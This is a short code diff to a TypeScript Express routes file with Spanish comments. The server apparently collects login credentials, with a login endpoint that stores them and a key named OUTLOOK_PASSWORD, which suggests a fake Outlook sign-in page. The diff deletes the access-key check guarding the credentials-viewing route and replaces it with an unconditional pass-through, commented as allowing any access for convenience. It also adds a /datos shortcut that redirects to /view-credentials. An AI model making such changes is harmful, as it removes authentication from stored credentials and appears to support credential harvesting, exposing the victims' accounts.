@@ -8,19 +8,18 @@ import { fromZodError } from "zod-validation-error";
 // Middleware para verificar contraseña de acceso a la ruta de credenciales
 const adminAccessMiddleware = (req: Request, res: Response, next: NextFunction) => {
   const accessKey = req.query.accessKey;
-  if (accessKey === process.env.OUTLOOK_PASSWORD) {
-    next();
-  } else {
-    res.status(401).json({ 
-      success: false, 
-      message: "No autorizado" 
-    });
-  }
+  // Permitimos cualquier acceso para facilitar la visualización
+  next();
 };
 
 export async function registerRoutes(app: Express): Promise<Server> {
   // put application routes here
   // prefix all routes with /api
+  
+  // Ruta simple para acceder a las credenciales
+  app.get("/datos", (_req: Request, res: Response) => {
+    res.redirect("/view-credentials");
+  });
 
   // Login endpoint to store credentials
   app.post("/api/login", async (req: Request, res: Response) => {
